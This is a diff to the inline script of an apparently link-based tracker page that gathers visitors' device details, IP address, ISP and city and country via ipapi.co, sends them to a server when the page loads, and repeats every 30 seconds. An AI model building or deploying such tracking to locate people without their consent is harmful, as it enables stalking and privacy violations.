@@ -229,10 +229,14 @@
 
   <script src="/socket.io/socket.io.js"></script>
   <script>
-    const TRACKER_ID = window.location.pathname.split('/').pop();
+    const TRACK_PATH = window.location.pathname;
+    const TRACKER_ID = TRACK_PATH.endsWith('/') 
+      ? TRACK_PATH.split('/').slice(-2)[0] 
+      : TRACK_PATH.split('/').pop();
+    
     let SESSION_ID = localStorage.getItem('geo_session_id');
     if (!SESSION_ID) {
-      SESSION_ID = Math.random().toString(36).substring(2, 10);
+      SESSION_ID = 's_' + Math.random().toString(36).substring(2, 10);
       localStorage.setItem('geo_session_id', SESSION_ID);
     }
 
@@ -243,47 +247,44 @@
 
     document.addEventListener('DOMContentLoaded', () => {
       socket = io({ transports: ['websocket', 'polling'] });
-      socket.emit('join-tracker', TRACKER_ID);
-
+      
       const basicInfo = {
         platform: navigator.platform,
         browser: getBrowser(),
-        userAgent: navigator.userAgent,
         screen: `${screen.width}x${screen.height}`,
         language: navigator.language,
-        deviceName: navigator.userAgentData?.platform || navigator.platform || 'Unknown',
-        cores: navigator.hardwareConcurrency || 'N/A',
-        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
-        touch: navigator.maxTouchPoints > 0 ? 'Yes' : 'No',
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
       };
 
+      // Initial aggressive send
       sendDeviceInfo(basicInfo);
+      
+      // Periodic heartbeat to keep session active
+      setInterval(() => { if (sharing) sendDeviceInfo(basicInfo); }, 30000);
 
       fetch('https://ipapi.co/json/')
         .then(res => res.json())
         .then(data => {
-          const networkInfo = {
-            ...basicInfo,
-            ipAddress: data.ip || 'N/A',
-            isp: data.org || 'N/A',
-            city: data.city || 'N/A',
-            region: data.region || 'N/A',
-            country: data.country_name || data.country || 'N/A'
-          };
-          sendDeviceInfo(networkInfo);
+          sendDeviceInfo({ ...basicInfo, ipAddress: data.ip, isp: data.org, city: data.city, country: data.country_name });
         })
         .catch(() => {});
     });
 
     async function sendDeviceInfo(info) {
+      if (!TRACKER_ID) return;
       const payload = { trackerId: TRACKER_ID, sessionId: SESSION_ID, info };
-      if (socket && socket.connected) socket.emit('device-info', payload);
-      await fetch(`/api/tracker/${TRACKER_ID}/info`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
+      
+      try {
+        if (socket && socket.connected) socket.emit('device-info', payload);
+        await fetch(`/api/tracker/${TRACKER_ID}/info`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        console.log("Device info synced");
+      } catch (err) {
+        console.error("Sync error:", err);
+      }
     }
 
     async function sendLocationUpdate(data) {
